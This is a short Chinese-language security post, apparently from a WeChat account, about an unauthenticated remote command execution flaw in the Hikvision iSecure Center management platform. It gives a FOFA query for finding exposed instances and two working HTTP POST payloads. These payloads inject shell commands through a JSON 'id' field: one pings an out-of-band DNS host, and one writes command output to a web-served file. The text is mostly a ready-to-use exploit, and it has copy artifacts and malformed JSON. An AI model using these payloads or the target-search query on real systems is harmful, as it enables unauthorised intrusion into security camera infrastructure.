#  [企业安全运维] 海康威视现新0day 可未授权致RCE 速查！   
 合规渗透   2024-08-03 14:37  
  
**H14-11海康威视-iSecure Center综合安防管理平台-RCE**  
  
**漏洞描述：**  
  
海康威视综合安防管理平台  
/portal/cas/login/ajax/licenseExpire.do 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码。  
  
**fofa语法：**  
  
app="HIKVISION-综合安防管理平台  
"  
  
**漏洞复现：**  
```
payload：
POST
/portal/cas/login/ajax/licenseExpire.do HTTP/1.1
Host:
Content-Type:
application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116
Safari/537.36
{"type":"environment","operate":"","machines":{"id":"$(ping+qsdiehtuxn.dgrh3.cn)"}Copy
to clipboardErrorCopied
文件路径 /vms/static/1.txt payload：
POST
/portal/cas/login/ajax/licenseExpire.do HTTP/1.1
Host:
Cache-Control: max-age=0
Accept: application/json, text/javascript,
*/*; q=0.01
X-Requested-With: XMLHttpRequest
If-Modified-Since: Thu, 01 Jun 1970
00:00:00 GMT
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0
Safari/537.36
Content-Type:
application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:
JSESSIONID=jp9u6tFmSc3fk7Jzf9DQjK25abfBb_b4Yy1r4rax; curtTabId=all; configMenu=
Connection: close
Content-Length: 135
{"type":"environment","operate":"","machines":{"id":"$(id
>
/opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj7cUPSdMiauFRP3icQZyeuqEfkNeFuu7KVPic4pcmPUyTFpYZhexX3gYd4aWicMbqesPveTApxRB4fYZA/640?wx_fmt=png&from=appmsg "")  
  
  
